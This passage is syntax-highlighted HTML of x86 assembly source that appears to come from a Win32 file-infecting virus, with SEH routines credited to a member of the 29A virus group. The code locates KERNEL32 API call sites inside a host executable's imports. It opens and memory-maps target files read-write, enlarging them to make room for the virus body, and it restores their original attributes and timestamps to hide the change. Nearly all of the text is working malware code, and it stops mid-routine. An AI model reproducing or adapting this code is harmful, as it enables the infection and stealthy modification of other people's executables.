        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">             </span><span class="sc1">;Below imports?</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">            </span><span class="sc1">;Above imports?</span><span class="sc0">

</span><span class="sc5">found_place</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Use this point? or better continue the search?</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_microsoft</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">15h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">00000001h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_base</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImportSH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">             </span><span class="sc1">;Below imports?</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">            </span><span class="sc1">;Above imports?</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                
        </span><span class="sc1">;If file is binded eax contains the address of the API</span><span class="sc0">
        </span><span class="sc1">;Lets check if eax points to a KERNEL32 API</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32CodeStart</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">inside_import</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32CodeEnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">found_place</span><span class="sc0">

</span><span class="sc5">inside_import</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImportSH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">             </span><span class="sc1">;Below imports?</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">err_api_call</span><span class="sc0">            </span><span class="sc1">;Above imports?</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">found_place</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;SEH handling routines coded by Jacky Qwerty / 29A</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">SEH_Frame</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">02h</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.RetAddr</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">SEH_RemoveFrame</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">02h</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.RetAddr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SEH_SetupFrame</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SEH_Frame</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.EH_ExceptionRecord</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ER_ExceptionFlags</span><span class="sc4">],</span><span class="sc0">          \
                               </span><span class="sc5">EH_UNWINDING</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">EH_EXIT_UNWIND</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ER_ExceptionCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">SEH_Search</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc5">EXCEPTION_ACCESS_VIOLATION</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">SEH_Search</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.EH_EstablisherFrame</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">02h</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Arg1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SEH_Search</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Open file and create its memory mapped image</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       BufStrFilename  -&gt; Buffer filled with path + filename</span><span class="sc0">
</span><span class="sc1">;       edi     -&gt; FALSE for read-only</span><span class="sc0">
</span><span class="sc1">;                  TRUE  for read-write</span><span class="sc0">
</span><span class="sc1">;Exit:</span><span class="sc0">
</span><span class="sc1">;       eax -&gt; Base address of memory map for file or null if error</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Save current file attributes</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">OpenMapFile</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufStrFilename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">e_OpenMapFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CurFileAttr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Blow up file attributes so we can read/write</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">      </span><span class="sc1">; dwFileAttributes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; lpFileName</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">e_OpenMapFile</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Open existing file</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; hTemplateFile</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">      </span><span class="sc1">; dwFlagsAndAttributes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">          </span><span class="sc1">; dwCreationDisposition</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; lpSecurityAttributes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; dwShareMode</span><span class="sc0">
                
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">open_ro</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
</span><span class="sc5">open_ro</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; dwDesiredAccess</span><span class="sc0">
                
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; lpFileName</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CreateFileA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Restore_Attrib</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_CreateFile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Create filemapping over file</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; lpName</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">DirectFindData</span><span class="sc4">+</span><span class="sc0">          \
                   </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">size_ro</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">size_virtual</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00008000h</span><span class="sc0">
</span><span class="sc5">size_ro</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; dwMaximumSizeLow</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; dwMaximumSizeHigh</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">map_ro</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_map_r</span><span class="sc0">
</span><span class="sc5">map_ro</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READONLY</span><span class="sc0">      </span><span class="sc1">; flProtect</span><span class="sc0">

</span><span class="sc5">done_map_r</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; lpFileMappingAttributes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; hFile</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Close_Create</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_FileMap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Map file in memory, get base address</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">; dwNumberOfBytesToMap  </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; dwFileOffsetLow</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; dwFileOffsetHigh</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">secmap_ro</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_secmap_ro</span><span class="sc0">
</span><span class="sc5">secmap_ro</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">          </span><span class="sc1">; dwDesiredAccess</span><span class="sc0">

</span><span class="sc5">done_secmap_ro</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; hFileMappingObject</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_MapView</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">map_is_here</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">err_MapView</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Close_Mapping</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">HandleClose</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Unmap memory mapped file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       ebx -&gt; File base address in memory</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">UnmapClose</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Close handle created by CreateFileMappingA</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Close_Mapping</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_FileMap</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Restore file time</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">HandleClose</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0">                                     \
                   </span><span class="sc5">DirectFindData</span><span class="sc4">+</span><span class="sc0">                          \
                   </span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
